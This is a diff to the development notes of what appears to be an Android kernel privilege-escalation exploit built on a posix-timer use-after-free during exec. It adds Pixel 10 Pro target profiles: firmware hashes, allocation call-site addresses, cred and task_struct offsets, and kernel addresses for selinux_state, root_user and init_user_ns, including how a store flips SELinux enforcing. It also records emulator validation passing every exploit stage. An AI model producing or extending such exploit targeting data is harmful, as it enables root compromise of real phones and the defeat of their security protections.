@@ -74,6 +74,7 @@ never downloaded whole; the extracted `boot.img` / `vendor_boot.img` /
 | lhasa, popsicle | `exec_task_namespaces`, **`posix_cpu_timers_exit`**, `exit_itimers` | yes |
 | hongkong, madrid | `exec_mmap`, `exec_task_namespaces`, **`posix_cpu_timers_exit`**, `exit_itimers` | yes |
 | Pixel 11 (cubs etc.) | `exec_mmap`, `exec_task_namespaces`, **`posix_cpu_timers_exit`**, `exit_itimers` | yes |
+| Pixel 10 Pro (blazer, 6.12.81, 4K and 16K) | `exec_mmap`, `exec_task_namespaces`, **`posix_cpu_timers_exit`**, `exit_itimers` | yes |
 
 Order at `begin_new_exec` is the whole exploit: the stale `k_itimer` is put on
 the timerqueue, `exec_mmap`/`exec_task_namespaces` free and replace the mm and
@@ -274,6 +275,107 @@ previous object is `sel_netport_hash`, `0x1800` lower, so the 8-byte store at
   `selinux_blob_off = 0x10`.
 - **F6** 0 errors, `--selfcheck` 0 failures. This is the only family where the
   worst-case object still fits: node `0x1ee0` + cred end `0x1fb0` < `0x2000`.
+
+---
+
+## 6.12.81 — Pixel 10 Pro, CP4A.261105.040.A1
+
+November 2026 security update. First 6.12.81 profile, and the first Pixel
+build in the tree that ships a 6.12 kernel: the Pixel 10 series moved off
+6.6.127 onto 6.12.81 with this release.
+
+### `6.12.81-android16-6-g4a1a020d156e-ab16388316-4k`
+
+The `mustang` (Pixel 10 Pro XL) row in the supported-devices table stays
+`untested`: this profile was derived from the `blazer` factory image only. The
+two devices ship one signed build, but the kernel payload was not compared
+against `mustang`'s own image the way the four 6.6.127 images were.
+
+- **F1** `blazer` (Pixel 10 Pro), build `CP4A.261105.040.A1`,
+  `android-info.txt` requires
+  `board=rango|deepspace|frankel|blazer|mustang`. **4K pages.**
+  `begin_new_exec` order:
+  `exec_mmap` → `exec_task_namespaces` → **`posix_cpu_timers_exit`** →
+  `exit_itimers` — vulnerable.
+- **F2** `boot.img` `sha256 1de8708d83ee5f39c1717ee7cf1d5d3098e25874982157ffd3a34653a6cca792`;
+  LZ4 payload `23337758d842c8babd0c97d68e54c2db871aa19adbe6dd05ded635467079c56d`;
+  raw `Image` `e0c7240d40436d94000dcbae4dfd4a17ff67201021cdce019a46e5a9e9989e8c`;
+  132 841 kallsyms symbols; BTF present. `vendor_boot.img`
+  `sha256 3116de94d65aac2c29bc4dd2e679c07f72689400498e8c5169f86ecf9902c41a`,
+  its vendor command line sets `android_arch_task_struct_size=784`.
+- **F3** `init_posix_timers` creates the cache with `size=0x100`; the object
+  is allocated in `alloc_posix_timer`, which has two
+  `bl kmem_cache_alloc_noprof` sites, `…9398` and `…940c`. The second brackets
+  the call with `current->alloc_tag` swaps (`mrs x20, SP_EL0` /
+  `str x21, [x20,#0x50]`), so it is the profiling path; the configured one is
+  `…9398` → **`timer_site = 0xffffffc0802c939c`**.
+  `copy_process` inlines `dup_task_struct`: the first
+  `bl kmem_cache_alloc_node_noprof` (x0 from `task_struct_cachep` at
+  `0xffffffc0828997d0`) returns to `…9f78` → **`copy_process_low21 = 0xc9f78`**
+  (`+0x144` into `copy_process`). The second (`…ac5c`, same cachep, `+0xe2c`)
+  is the alloc-tag path and was rejected.
+- **F4** BTF: `cred` `0xb8` (`usage` `0x0`/8B, uid `0x8`, euid `0x18`,
+  cap `0x30`, security `0x80`); `task_struct` `0x1440`, cred `0x900`;
+  `k_itimer` `0x100`, `it` `0x78` → `timer_node_off = 0x78` stays the default.
+  `task_alloc_bytes = 0x1440 + 0x310 = 0x1750` — the vendor extension is
+  `android_arch_task_struct_size=784` from `vendor_boot`, as on the Pixel 11.
+  `cred_init` `mov w1,#0xb8` / flags `0x2110` → `cred_alloc = 0xc0`.
+- **F5** `selinux_state 0xffffffc0828eb9a8`, `panic_on_warn 0xffffffc08263ade0`,
+  `root_user 0xffffffc082662348`, `init_user_ns 0xffffffc0826620d0`,
+  `init_ucounts 0xffffffc082663ce0`, `init_groups 0xffffffc082663810`.
+  `selinux_state - 8` is `avc_latest_notif_update.notif_lock` and BTF puts
+  `enforcing` at bit 0, so the `-7` store lands on `enforcing`.
+  `selinux_blob_off = 0x8`: effective LSM order is
+  `capability, landlock, safesetid, selinux, bpf` with `lbs_cred`
+  landlock 8 / selinux 24, aggregate blob `0x20`.
+- **F6** 0 errors, `--selfcheck` 0 failures. Worst case spills by `0x48` into
+  the next object, the designed `run_plant()` retry.
+
+### `6.12.81-android16-6-g4a1a020d156e-ab16388316-16k`
+
+The same factory image also carries a standalone `kernel_16k`. Its release
+string has **no `-4k` suffix**, so it is a distinct profile selected by page
+size (both the app and `load_conf()` compare `page_size`).
+
+- **F1** same build, 16K pages; `begin_new_exec` order is identical —
+  vulnerable.
+- **F2** `kernel_16k` `sha256 c57d40d38c258430290c0c428e82aa822adb4c7d25a32514dbe81899faf0ae09`;
+  raw `Image` `efa65cbf3472a3cfdd57a8d666c76b9f9fa368898e7214d2365f5e619c7c7f50`;
+  132 095 symbols; BTF present. Same `android_arch_task_struct_size=784`.
+- **F3** here `dup_task_struct` is a **standalone function** (not inlined), so
+  the task_struct site is read from its body: the first
+  `bl kmem_cache_alloc_node_noprof` returns to `+0x54`
+  → **`copy_process_low21 = 0xdfb48`**; the second (`…dff64`) is the
+  alloc-tag path. `do_timer_create` allocates the timer:
+  `bl kmem_cache_alloc_noprof` at `…86d0` → **`timer_site = 0xffffc000801f86d4`**
+  (the `…8bb0` site is the alloc-tag path).
+- **F4** BTF identical to the 4K build: `cred 0xb8`, `task_struct 0x1440`,
+  `k_itimer 0x100`/`it 0x78`, `task_alloc_bytes 0x1750`.
+- **F5** `selinux_state 0xffffc000828d99b8`, `panic_on_warn 0xffffc00082610de0`,
+  `root_user 0xffffc0008263b348`, `init_user_ns 0xffffc0008263b0d0`,
+  `init_ucounts 0xffffc0008263cce0`, `init_groups 0xffffc0008263c810`.
+  Same LSM order and `selinux_blob_off = 0x8`.
+- **F6** 0 errors, `--selfcheck` 0 failures. `slab_order = 0`,
+  `slab_size = 0x4000`, `pcp_free = 0` as for the other 16K profile.
+
+**F7–F11** — both page sizes booted in QEMU against the unmodified factory
+`Image` and passed every gate on the **first attempt, no retry**
+(`logs/mass-blazer.json`):
+
+| profile | slabinfo | F7 | F8 | F9 | F10 | F11 |
+|---|---|---|---|---|---|---|
+| `…-ab16388316-4k` | pass | pass | pass | pass | pass | pass |
+| `…-ab16388316-16k` | pass | pass | pass | pass | pass | pass |
+
+`slabinfo` reported `posix_timers_cache` object `0x100` at order 1 (4K, 32
+objects) and order 0 (16K, 64 objects), and `task_struct` `0x1780` — the
+requested `0x1750` rounded up to the 64-byte `s->align`, exactly as for cubs.
+
+`validate_conf.py` needed one fix to cover this pair: a 16K profile's release
+string is a strict prefix of the 4K one, so the substring test matched the 4K
+`vmlinux` and failed the 16K symbols. It now breaks the tie on the sibling raw
+`Image`'s page size (the rule `mass.py` already used). With that, the whole
+`conf/` suite still validates at 0 errors.
 
 ---
 
@@ -1246,6 +1348,8 @@ run.
 | 6.12.69-…-abogki561813157-4k | byron/pudding/nezha | pass | pass | pass | pass | pass | pass |
 | 6.12.69-…-abogki537510563-4k | brussels | pass | pass | pass | pass | pass | pass |
 | 6.12.69-…-ab16108597-4k | cubs (Pixel 11) | pass | pass | pass | pass | pass | pass |
+| 6.12.81-…-ab16388316-4k | blazer (Pixel 10 Pro) | pass | pass | pass | pass | pass | pass |
+| 6.12.81-…-ab16388316-16k | blazer 16K | pass | pass | pass | pass | pass | pass |
 | 6.18.21-…-abogki555938958-4k | hongkong/madrid | pass | pass | pass | pass | pass | pass |
 | 6.18.21-…-abogki565292102-4k | lhasa/yingtian | pass | pass | pass | pass | pass | pass |
 | 6.6.118-…-ab15657065-4k | mist | pass | pass | pass | pass | pass | pass |
